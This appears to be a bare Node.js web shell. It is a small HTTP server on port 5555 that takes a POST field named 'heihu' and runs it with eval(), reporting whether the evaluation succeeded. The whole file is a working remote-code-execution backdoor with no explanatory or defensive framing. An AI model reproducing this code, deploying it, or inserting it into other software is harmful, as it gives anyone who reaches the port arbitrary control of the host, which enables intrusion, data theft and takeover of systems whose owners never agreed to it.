var http = require('http');

var querystring = require('querystring');

var server = http.createServer(function(request, response){

    response.writeHead(200, {'Content-Type':'text/html;charset=utf8'});

    if(request.method.toLocaleLowerCase() == 'post'){

        var string = '';

        request.addListener('data', function(chunk){

            string += chunk;

        });

        request.addListener('end', function(){

            var strObj = querystring.parse(string);

            if(strObj.heihu){

                try {

                    eval(strObj.heihu);

                    response.end('Eval Ok');

                }catch(e){

                    console.log(e);

                    response.end('Eval Error');

                }

            }else{

                response.end('Pass Error');

            }

        });

    }else{

        response.end();

    }

});

server.listen(5555);
